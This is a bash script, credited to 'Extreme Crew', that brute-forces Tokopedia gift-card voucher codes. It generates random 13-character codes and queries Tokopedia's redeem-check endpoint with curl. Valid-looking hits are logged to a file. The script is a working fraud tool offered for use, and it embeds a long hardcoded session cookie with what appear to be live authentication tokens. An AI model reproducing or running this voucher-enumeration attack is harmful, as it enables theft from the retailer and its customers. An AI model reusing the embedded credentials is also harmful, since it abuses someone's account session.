#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
rm -f extreme.crew
clear
header
if [ ! $1 ];then
echo "1 Akun Max 10 kali generate"
echo "Usage : $0 <jumlah generate>"
echo "EX : $0 10"
exit
fi
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUyNDQ2OTg2M3xJbWxWYjFnNGRucHNiRkZaZURaWlJtbHZTM0kzTUhsc1RrMUNUVnAwV2l0M05VaDRaRzE2ZERoamNsazlJZ289fMvY3clMK828mJOeQ3-EIPvanRlaUX_JIYerH4GdMN_a; _ID_autocomplete_=67310ab2b015472090276aadb120b64c; state=eyJyZWYiOiJodHRwczovL3d3dy50b2tvcGVkaWEuY29tLyIsInV1aWQiOiI3NWJlZTdiZS03NDNkLTQ4OTItOTBkYy01Yjc1ZTVkYWNjMjYiLCJ0aGVtZSI6ImlmcmFtZSIsInAiOiJodHRwczovL3d3dy50b2tvcGVkaWEuY29tLyJ9; _BID_TOKOPEDIA_=270b50252c10cc87501fd0002072f346; tLiteSession=s%3AfcmlRASTgOLc_CacVs0EMrRxIzeFHCna.P%2F87UCi5gea3W5NUWwxFRzfkUfCa3d8jfyIZpcIpIlo; cto_lwid=5f3612f5-f0d1-4486-8826-475c4387f270; AMP_TOKEN=%24NOT_FOUND; __ssid=4b5dbe6b-d70e-4ca0-82e8-10d10b474913; __sonar=13472787275116319586; lang=id; insdrSV=4; l=1; ins-gaSSId=c2a0aba1-50a0-4513-28f6-4a8c9e0e9835_1524473401; scs=%7B%22t%22%3A1%7D; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiYTUzMTllNWEtNTRlYS00MDRlLWJiYTktYWJlYjYxYmUyYTJkIiwiaXNfYWpheCI6dHJ1ZX0; pulsa-aff=undefined; _ga=GA1.2.1284001704.1524469737; _gid=GA1.2.1224953784.1524469737; _dc_gtm_UA-9801603-23=1; _SID_Tokopedia_=8iNw-wlIkT1kfThj0lJxsCaeFHRp4wmIFHiztBXuJW03hvpD4yc0f0J7ji5h0NilF3ST7vakNh8tp8MEzssAg08La9VbuBWSOnD1m3aH_cwSnPDm6u9PPYLn86Yr4yWk; _uetsid=_uet8d549601; _ampSES=b6cea6ec3dSES0a03eedf747f-30798-1524469866064; _ampUITN=84147c2289bot15314264adf3-30798-1524469866066; _ampNV=0; _ampRV=1; _ampCon=-; _ampCity=-"
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=FPL$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	ngegas=$(ngelog $generate | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	if [[ "$ngegas" ]]; then
		echo "$ngegas"
		echo "[-$ngegas-] $generate" >> tokopedia.txt
	fi
done
rm -f extreme.crew
